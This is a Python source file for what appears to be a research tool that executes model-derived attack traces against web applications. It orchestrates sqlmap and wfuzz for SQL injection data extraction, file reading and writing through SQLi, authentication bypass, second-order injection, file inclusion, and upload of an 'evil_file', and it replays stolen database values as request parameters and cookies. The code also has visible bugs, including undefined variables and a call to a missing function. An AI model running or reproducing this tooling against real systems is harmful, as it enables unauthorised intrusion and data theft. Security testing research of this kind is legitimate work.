#!/usr/local/bin/python3.5

"""
This module executes a trace
"""

import os
import re
import json
import config
import parser
import atexit
import requests
import linecache
import threading
import itertools
import modules.sqli.sqli as sqli
import modules.filesystem.fs as fs
import modules.wrapper.sqlmap as sqlmap

from modules.logger import logger
# disable warnings when making unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules.http import execute_request
from os.path import isfile, join, expanduser, dirname, realpath
from os import listdir


# global request
s = None

# global attack domain
attack_domain = ""

# specific for executing sqlmap
data_to_extract = []

def exitcleanup():
    debugMsg = "exiting {}".format(__name__)
    logger.debug(debugMsg)

# takes an attack trace and an extension matrix, and execute the attack
def execute_attack(msc_table,msc_table_info,file_aslanpp):
    global s
    global attack_domain
    logger.info("Executing the attack trace")


    atexit.register(exitcleanup)

    # general fields for sperforming an HTTP request
    url = None
    method = None
    params = None
    mapping = None
    abstract_param_to_real = None

    # web application's output
    sqlmap_output = None
    files_output = []

    # request session object for performing subsequent HTTP requests
    s = requests.Session()

    # current response
    response = None

    # load the concretization file
    with open(config.concretization,"r") as data_file:
         concretization_data = json.load(data_file)
         data_file.close()
    attack_domain = concretization_data["domain"]

    __got_cookie = False

    # loop the msc_table, the main execution loop
    for idx, row in enumerate(msc_table):
        if "<i" in row[1][0]:
            # intruder step
            tag = row[0]
            m = row[1]
            sender = m[0]
            receiver = m[1]
            message = m[2]
            debugMsg = "Message: {}".format(message)
            logger.debug(debugMsg)
            attack_details = msc_table_info[tag]
            attack = attack_details["attack"]
            params = None
            try:
                params = attack_details["params"]
            except KeyError:
                pass

            # if we have the keep-cookie option, we make a first empty request to
            # get the initial set-cookie
            # TODO: this request should be improved considering also the
            # parameters and the cookies
            if config.keep_cookie and not __got_cookie:
               #msc_table[
               logger.debug("executing first request for getting cookie")
               first_request = {}
               first_request["url"] = concretization_data[tag]["url"]
               first_request["method"] = concretization_data[tag]["method"]
               r = execute_request(s,first_request)
               s.cookies.clear()
               config.cookies = r.cookies
               __got_cookie = True


            # continue?
            infoMsg = "Executing {}\ncontinue?".format(row[1])
            c = __ask_yes_no(infoMsg)
            if not c:
                exit(0)

            # start populating the structure used for performing attacks\requests
            req = {}
            req["url"] = concretization_data[tag]["url"]
            req["method"] = concretization_data[tag]["method"]
            # now create the params
            req_params = {}
            if "params" in concretization_data[tag]:
                for k,v in concretization_data[tag]["params"].items():
                    K,V = v.split("=")
                    req_params[K] = V
                req["params"] = req_params

            if attack == 8:
                logger.info("Second order injection")
                logger.warning("Support for second order injection is limited")
                c = __ask_yes_no("Are you really sure you want to procede?")
                if not c:
                    logger.info("Aborting execution")
                    exit(0)
                so_tag = attack_details["so_tag"]
                so_step = None
                for item in msc_table:
                    if item[0] == so_tag:
                        so_step = item
                        debugMsg = "Exploiting so in {} and {}:{}".format(tag,so_tag,item)
                        logger.debug(debugMsg)
                        break
                req["secondOrder"] = concretization_data[so_tag]["url"]
                
                sqli.execute_sqlmap(req)
                continue

            # filesystem inclusion
            if attack == 4:
                logger.info("Perform file inclusion attack!")

                debugMsg = "execute attack on param {}".format(params)
                logger.debug(debugMsg)

                # TODO: the next two lines are really bad
                pages = msc_table[idx+1][1][2].split(".")
                # baaad, we assume that position 0 is always the page we're looking for
                check = concretization_data[pages[0]]

                read_file, search = __get_file_to_read(message,concretization_data)
                debugMsg = "filesystem inclusion: {} we're looking for: {}".format(read_file, search)
                logger.debug(debugMsg)
                payloads = fs.payloadgenerator(read_file)
                debugMsg = "payloads generated: {}".format(payloads)
                logger.debug(debugMsg)
                req["payloads"] = payloads
                req["ss"] = search
                wfuzz_output = fs.execute_wfuzz(req)
                if len(wfuzz_output) > 0:
                    # we successfully found something, write it on files and show them to the
                    # user. Save the file in a local structure so that they can be used in further
                    # requests
                    logger.info("saving extracted files")
                    for page in wfuzz_output:
                        url = page["url"]
                        # I should make a request and retrieve the page again
                        req["url"] = url
                        if len(page["postdata"]) > 0:
                            req["method"] = "post"
                        req["params"] = {}
                        for k,v in page["postdata"].items():
                            req["params"][k] = v
                        response = execute_request(s,req)
                        pathname = url.replace("http://","").replace("https://","").replace("/","_")
                        filepath = os.path.join(".",pathname)
                        f = open(filepath,"w")
                        f.write(response.text)
                        f.close()
                        files_output.append(filepath)
                        logger.info(filepath)
                    logger.debug(files_output)
                    logger.info("Files have been saved")
                else:
                    # we couldn't find anything, abort execution
                    logger.critical("File inclusion did not succeed")
                    exit()
                continue


            # SQL-injection filesystem READ
            if attack == 1:
                logger.info("Perform SQLi attack for file reading!")

                real_file_to_read, search = __get_file_to_read(message, concretization_data)

                infoMsg = "file to read: {}".format(real_file_to_read)
                logger.info(infoMsg)

                req["read"] = real_file_to_read
                sqli.execute_sqlmap(req)

                # extracted files can be found in ~/.sqlmap/output/<attacked_domani>/files/
                # list extracted file content
                tmp_files = sqli.get_list_extracted_files(attack_domain)
                logger.info("The attack performed the following result:")

                for f in tmp_files:
                    if search in open(f,"r").read():
                        infoMsg = "File {} contains the {} string".format(f,search)
                        logger.info(infoMsg)
                        files_output = files_output + f
                continue

            # SQL-injection filesystem WRITE
            if attack == 2:
                logger.info("Perform SQLi attack for file writing!")
                abstract_evil_file = re.search(r'sqli\.([a-zA-Z_]*)',request_message).group(1)
                real_evil_file = concretization_data["files"][abstract_evil_file]
                debugMsg = "file to write: {}".format(readl_evil_file)
                logger.debug(debugMsg)

                req["write"] = real_evil_file
                sqli.execute_sqlmap(req)
                continue


            # SQL-injection
            if attack == 0:
                # data extraction
                logger.debug(params)
                if params != None:
                   logger.info("Perform data extraction attack!")

                   # get the table and columns to be enumarated
                   extract = []
                   exploitations = attack_details["params"]
                   debugMsg = "Exploitations: {}".format(exploitations)
                   logger.debug(debugMsg)
                   for i,tag2 in enumerate(exploitations):
                         exploit_points = exploitations[tag2]
                         for k in exploit_points:
                             try:
                                 tmp_map = concretization_data[tag2]["params"][k].split("=")[0]
                             except KeyError:
                                 tmp_map = concretization_data[tag2]["cookies"][k].split("=")[0]
                             tmp_table = concretization_data[tag2]["tables"][tmp_map]
                             extract.append(tmp_table)

                   req["extract"] = extract
                   # for the execution we need (url,method,params,data_to_extract)
                   # data_to_extract => table.column
                   # sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
                   output = sqli.execute_sqlmap(req)
                   sqlmap_output = sqli.sqlmap_parse_data_extracted(output)
                   logger.debug(sqlmap_output)
                   if not sqlmap_output:
                       logger.warning("No data extracted from the database")
                       exit()
                # authentication bypass
                else:
                   logger.info("Perform authentication bypass attack!")
                   req = {}
                   req["url"] = concretization_data[tag]["url"]
                   req["method"] = concretization_data[tag]["method"]
                   # now create the params
                   params = {}
                   for k,v in concretization_data[tag]["params"].items():
                       tmp = v.split("=")
                       params[tmp[0]] = tmp[1]
                   req["params"] = params

                   pages = msc_table[idx+1][1][2].split(".")
                   check = concretization_data[pages[0]] # baaad, we assume that position 0 is always the page we're looking for
                   is_bypassed = sqli.execute_bypass(s,req,check)
                   if is_bypassed:
                       logger.info("bypass succeeded")
                   else:
                       logger.info("bypass error, abort execution")
                       exit(0)
                continue

            # exploit the sqli as a normal request
            # where we use the result from sqlmap
            if attack == 6:
                logger.info("Exploit SQLi attack")

                # initialize base request
                req = {}
                req["url"] = concretization_data[tag]["url"]
                req["method"] = concretization_data[tag]["method"]
                req_params = []
                # generate all possible combination of parameters
                try:
                    concretization_params = concretization_data[tag]["params"]
                    req_params = []
                    for k,v in concretization_params.items():
                        tmp = v.split("=")
                        pair = []
                        if tmp[1] == "?":
                           # we need to provide something from the output of sqlmap
                           concrete_table = None
                           try:
                               concrete_table = concretization_data[tag]["tables"][tmp[0]].split(".")
                           except KeyError:
                               logger.critical("couldn't find table details in the concretization file")
                               exit(0)
                           extracted_values = sqlmap_output[concrete_table[0]][concrete_table[1]]
                           for v in extracted_values:
                               pair.append(tmp[0]+"="+v)
                           req_params.append(pair)
                        else:
                            pair.append(tmp[0] + "=" + tmp[1])
                            req_params.append(pair)
                    debugMsg = "req_params: {}".format(req_params)
                    logger.debug(debugMsg)
                except KeyError:
                    logger.warning("no parameters defined in the concretization file")

                # generate all possible combination of cookies
                req_cookies = []
                try:
                    concretization_cookies = concretization_data[tag]["cookies"]
                    req_cookies = []
                    for k,v in concretization_cookies.items():
                        tmp = v.split("=")
                        pair = []
                        if tmp[1] == "?":
                           # we need to provide something from sqlmap output
                           concrete_table = None
                           try:
                               concrete_table = concretization_data[tag]["tables"][tmp[0]].split(".")
                           except KeyError:
                               logger.debug("coldn't find table details in the concretization file")
                               exit(0)
                           extracted_values = sqlmap_output[concrete_table[0]][concrete_table[1]]
                           for v in extracted_values:
                               pair.append(tmp[0]+"="+v)
                           req_cookies.append(pair)
                        else:
                            pair.append(tmp[0] + "=" + tmp[1])
                            req_cookies.append(pair)
                    debugMsg = "req_cookies: {}".format(req_cookies)
                    logger.debug(debugMsg)
                except KeyError:
                    logger.warning("no cookies defined in the concretization file")
                # I used the %26 (encode of &) because it might happen that the password has a &
                # and when I split, I split wrong
                params_perm = []
                cookies_perm = []
                if len(req_params) > 0:
                    params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
                if len(req_cookies) > 0:
                    cookies_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_cookies)]
                debugMsg = "params perm: {}".format(params_perm)
                logger.debug(debugMsg)
                debugMsg = "cookies perm: {}".format(cookies_perm)
                logger.debug(debugMsg)

                found = False
                # loop on all the possibile params and cookies combination and try to exploit the result
                if len(params_perm) == 0 and len(cookies_perm) > 0:
                    # we only have cookies
                    for header in cookies_perm:
                        if not found:
                            debugMsg = "Attempt to exploit sqli: {}".format(header)
                            logger.debug(debugMsg)
                            req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                            response = execute_request(s,req)
                            found = __check_response(idx,msc_table,concretization_data,response)
                elif len(params_perm) > 0 and len(cookies_perm) == 0:
                    # we only have params
                    for param in params_perm:
                        if not found:
                            debugMsg = "Attempt to exploit sqli: {}".format(param)
                            logger.debug(debugMsg)
                            req["params"] = dict( item.split("=") for item in param.split("%26") )
                            response = execute_request(s,req)
                            found = __check_response(idx,msc_table,concretization_data,response)
                elif len(params_perm) > 0 and len(cookies_perm) > 0:
                    # we have params and cookies values
                    for param in params_perm:
                        req["params"] = dict( item.split("=") for item in param.split("%26") )
                        for header in cookies_perm:
                            if not found:
                                debugMsg = "Attempt to exploit sqli: {}".format(param)
                                logger.debug(debugMsg)
                                req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                                response = execute_request(s,req)
                                found = __check_response(idx,msc_table,concretization_data,response)

                if not found:
                    # we couldn't procede in the trace, abort
                    logger.warning("Exploitation failed, abort trace execution")
                    exit(0)
                logger.info("Exploitation succceded")
                continue

            # exploit a file upload
            if attack == 5:
                exp_params = attack_details["params"]
                files = {}
                for k,v in exp_params.items():
                    try:
                        real_pair = concretization_data[tag]["params"][k]
                    except KeyError:
                        criticalMsg = "Concretization file error, key {} not found in {}".format(k,tag)
                        logger.critical(criticalMsg)
                        exit(0)
                    real_k,real_v = real_pair.split("=")
                    del req["params"][real_k]
                    # select which payload to upload
                    if v == "evil_file":
                        files[real_k] = open("evil_file.txt","rb")
                req["files"] = files
                response = execute_request(s,req)

                logger.debug(response)

            # exploit filesystem attacks
            if attack == 7:
                logger.info("Exploit file-system")
                __ask_file_to_show(files_output)
                logger.debug(req["params"])
                for k,v in req["params"].items():
                    if v == "?":
                        inputMsg = "Provide value for: {}\n".format(k)
                        new_value = input(inputMsg)
                        req["params"][k] = new_value
                response = execute_request(s,req)
                found = __check_response(idx,msc_table,concretization_data,response)
                if not found:
                    logger.warning("Exploitation failed, abort trace execution")
                    exit(0)
                continue

            # normal http request
            # we consider Forced browsing e File upload as normal requests
            if attack == -1:
                logger.info("Perform normal request")
                logger.debug(msc_table[idx][0])
                if "params" in req:
                    for k,v in req["params"].items():
                        if v == "?":
                            inputMsg = "Provide value for: {}\n".format(k)
                            new_value = input(inputMsg)
                            req["params"][k] = new_value
                response = execute_request(s,req)
                found = __check_response(idx,msc_table,concretization_data,response)
                if not found:
                    logger.critical("Response is not valid")
                    exit(0)
                logger.info("Step succeeded")
                continue

    # end loop over the msc
    logger.info("Trace ended successfully")



def __ask_file_to_show(files):
    selection = ""
    while True:
        i = 0
        for f in files:
            logger.info("%d) %s", i,f)
            i = i + 1
        selection = input("Which file you want to open? (d)one ")
        if selection == "d":
            return
        try:
            index = int(selection)
            if index < len(files):
                with open(files[int(selection)],"r") as f:
                    for line in f:
                        print(line.rstrip())
            else:
                raise Exception
        except Exception:
            logger.critical("invalid selection")

def __show_available_files(files,search):
    for f in files:
        if search in open(f,"r").read():
            logger.info("%s\t true" , f)
        else:
            logger.info("%s\t false", f)



def __get_file_to_read(message, concretization_data):
    real_file_to_retrieve = ""
    if "path_injection" in message:
        # it means we prompt the user for the filename
        real_file_to_retrieve = input("Which file yuo want to read?")
    else:
        # get the name of the file to retrieve from the concretization file
        abstract_file_to_retrieve = re.search(r'sqli\.([a-zA-Z]*)',message).group(1)
        real_file_to_retrieve = concretization_data["files"][abstract_file_to_retrieve]
        # and ask the user if it's ok
        c = __ask_yes_no("The file that will be read is: " + real_file_to_retrieve + ", are you sure?")
        if not c:
            # ask the user which file to retrieve
            real_file_to_retrieve = input("Which file you want to read?")
    # TODO: ask what regexp we should be looking for
    search = input("What are you looking for?")
    return real_file_to_retrieve, search

def __check_response(idx,msc_table,concretization_data,response):
    pages = msc_table[idx+1][1][2].split(".")
    p = pages[0]
    logger.debug(concretization_data[p])
    try:
            if response != None and concretization_data[p] in response.text:
                logger.debug("valid request")
                logger.debug(concretization_data[p])
                return True
    except Exception:
             return False
             logger.debug("NO ")
    return False


def __ask_yes_no(msg,default="y"):
    prompt = " [Y/n]"
    ret = True
    if default == "n":
        prompt = " [n/Y]"
        ret = False
    s = input(msg + prompt)
    if s == "":
        return ret
    if s == "Y" or s == "y":
        return True
    elif s == "N" or s == "n":
        return False
    else:
        print("Invalid input");
        return __ask_yes_no(msg,default)


if __name__ == "__main__":
    execute_normal_request("c")

